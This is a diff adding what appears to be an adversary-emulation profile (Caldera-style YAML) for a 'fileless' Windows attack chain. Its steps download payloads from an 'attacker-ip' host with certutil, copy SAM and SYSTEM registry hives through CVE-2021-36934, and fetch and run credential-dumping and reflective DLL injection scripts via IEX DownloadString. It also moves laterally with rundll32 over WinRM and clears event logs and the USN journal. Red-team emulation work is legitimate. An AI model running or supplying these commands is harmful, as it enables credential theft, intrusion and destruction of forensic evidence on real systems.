@@ -1,0 +1,88 @@
+
+id: f7f341dd-4b78-4f1c-95b1-6d63455fcd1e
+name: NSFW_Fileless_Chain
+description: |
+  Fileless malware chain exploiting CVE-2021-36934 using LOLBins, reflective DLL injection, and credential dumping.
+  Delivered via PowerShell and LOLBins with in-memory execution to evade detection.
+
+atomic_ordering:
+  - stage_payload
+  - extract_registry
+  - dump_hashes
+  - lateral_move
+  - dll_inject
+  - cleanup
+
+facts: []
+
+steps:
+  - id: stage_payload
+    name: Stage Payload via Certutil
+    tactic: defense-evasion
+    technique:
+      attack_id: T1105
+      name: Ingress Tool Transfer
+    executors:
+      - name: psh
+        command: |
+          $payload = "$env:TEMP\nsfw.jpg"
+          certutil -urlcache -split -f "http://attacker-ip/nsfw.jpg" $payload
+
+  - id: extract_registry
+    name: Exploit CVE-2021-36934 to Extract Registry Hives
+    tactic: privilege-escalation
+    technique:
+      attack_id: T1003.002
+      name: SAM
+    executors:
+      - name: psh
+        command: |
+          Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" "$env:TEMP\SAM"
+          Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" "$env:TEMP\SYSTEM"
+          Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" "$env:TEMP\SECURITY"
+
+  - id: dump_hashes
+    name: Dump Hashes via secretsdump.ps1 (Fileless)
+    tactic: credential-access
+    technique:
+      attack_id: T1003.002
+      name: Credential Dumping - Registry
+    executors:
+      - name: psh
+        command: |
+          IEX (New-Object Net.WebClient).DownloadString("http://attacker-ip/secretsdump.ps1")
+          Invoke-SecretsDump -System $env:TEMP\SYSTEM -Security $env:TEMP\SECURITY -Sam $env:TEMP\SAM
+
+  - id: lateral_move
+    name: Lateral Movement via PowerShell Remoting
+    tactic: lateral-movement
+    technique:
+      attack_id: T1021.006
+      name: Windows Remote Management
+    executors:
+      - name: psh
+        command: |
+          Invoke-Command -ScriptBlock { rundll32.exe \\attacker\share\nsfw.dll,#1 } -ComputerName 192.168.1.10 -Credential $cred
+
+  - id: dll_inject
+    name: Reflective DLL Injection via PowerShell
+    tactic: execution
+    technique:
+      attack_id: T1218.011
+      name: Rundll32
+    executors:
+      - name: psh
+        command: |
+          IEX (New-Object Net.WebClient).DownloadString("http://attacker-ip/Invoke-ReflectivePEInjection.ps1")
+          Invoke-ReflectivePEInjection -PEUrl "http://attacker-ip/nsfw.dll" -FuncName "DllMain"
+
+  - id: cleanup
+    name: Clear Logs and Delete USN Journal
+    tactic: defense-evasion
+    technique:
+      attack_id: T1070.001
+      name: Clear Windows Event Logs
+    executors:
+      - name: cmd
+        command: |
+          wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D C:
